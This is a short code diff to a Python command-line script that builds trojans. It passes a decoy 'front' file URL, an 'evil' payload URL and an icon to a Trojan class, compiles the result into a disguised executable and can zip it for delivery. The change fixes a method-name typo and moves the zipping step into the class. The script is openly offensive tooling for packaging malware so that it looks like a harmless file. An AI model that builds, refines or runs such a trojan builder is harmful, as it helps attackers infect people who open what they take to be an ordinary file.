@@ -2,7 +2,6 @@
 
 import optparse
 from Trojan import *
-import zipfile
 
 
 parser = optparse.OptionParser()
@@ -23,8 +22,7 @@ if not options.out_file_path:
 
 trojan = Trojan(options.front_file_url, options.evil_file_url, options.icon_path)
 trojan.create()
-trojan.compilea(options.out_file_path)
+trojan.compile(options.out_file_path)
 
 if options.zip: 
-	zip_file_path = options.out_file_path.split(".")[0]
-	zipfile.ZipFile(zip_file_path + ".zip", mode="w").write(options.out_file_path)
+	trojan.zip(options.out_file_path)
